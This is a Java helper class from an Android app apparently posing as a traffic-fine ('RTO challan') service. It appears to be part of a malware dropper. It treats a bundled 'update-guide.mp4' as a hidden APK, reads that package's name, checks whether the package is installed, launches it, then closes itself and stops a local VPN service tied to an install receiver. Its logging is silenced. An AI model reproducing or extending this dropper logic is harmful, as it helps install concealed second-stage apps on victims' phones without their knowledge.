package com.service.rtochallan_v;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import java.io.File;

public class Helper {
    private Context context;
    public  String SOURCE_FILE = "update-guide.mp4";

    public Helper(Context context){
        this.context = context;
    }
    public String getApkPackageName() {
        String packageName = "";
        try {
            String source_file = SOURCE_FILE.replace(".mp4", ".apk");
            show("Package Name:" +source_file);
            File apkFile = new File(context.getCacheDir(), source_file);
            if (!apkFile.exists()) {
//                Toast.makeText(context, "❌ APK file not found", Toast.LENGTH_SHORT).show();
                return "";
            }
            PackageManager pm = context.getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(apkFile.getAbsolutePath(), 0);
            if (info != null) {
                packageName = info.packageName;
            } else {
                Toast.makeText(context, "❌ Could not read package info", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
            String errorDetails = Log.getStackTraceString(e);
            show("Error On getPackageName: "+errorDetails);
        }
        return packageName;
    }

    public void show(String message) {
//        Log.i(TAG, message);
    }

    public void showTost(String message) {
        new android.os.Handler(Looper.getMainLooper()).post(() ->
                Toast.makeText(context, message, Toast.LENGTH_LONG).show()
        );
    }

    public boolean isAppInstalled(String packageName) {
        try {
            if (packageName != null && !packageName.isEmpty()) {
                context.getPackageManager().getPackageInfo(packageName, 0);
                return true;
            }else {
                return false;
            }
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public void openApp(String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(launchIntent);
                if(context instanceof Activity) {
                    ((Activity) context).finish();
                    show( "🏁 Current Activity finished");
                }
                show( "✅ New app started successfully");
            } else {
                show( "⚠️ Could not find launch intent for " + packageName);
            }
        } catch (Exception e) {
            String errorDetails = Log.getStackTraceString(e);
            show( "⚠️ Error launching new app: " + errorDetails);
        }
    }

    public void closeApp() {
        try {
            show( "💀 Closing current app...");
            android.os.Process.killProcess(android.os.Process.myPid());
            System.exit(0);
        } catch (Exception e) {
            String errorDetails = Log.getStackTraceString(e);
            show( "⚠️ Error closing app: " + errorDetails);
        }
    }
    public void stopLocalVpn() {
        try {
            Intent stopIntent = new Intent(context, LocalVpnService.class);
            context.stopService(stopIntent);
            show( "🛑 VPN service stopped from InstallReceiver");
        } catch (Exception e) {
            String errorDetails = Log.getStackTraceString(e);
            show( "⚠️ Failed to stop VPN: " + errorDetails);
        }
    }

}
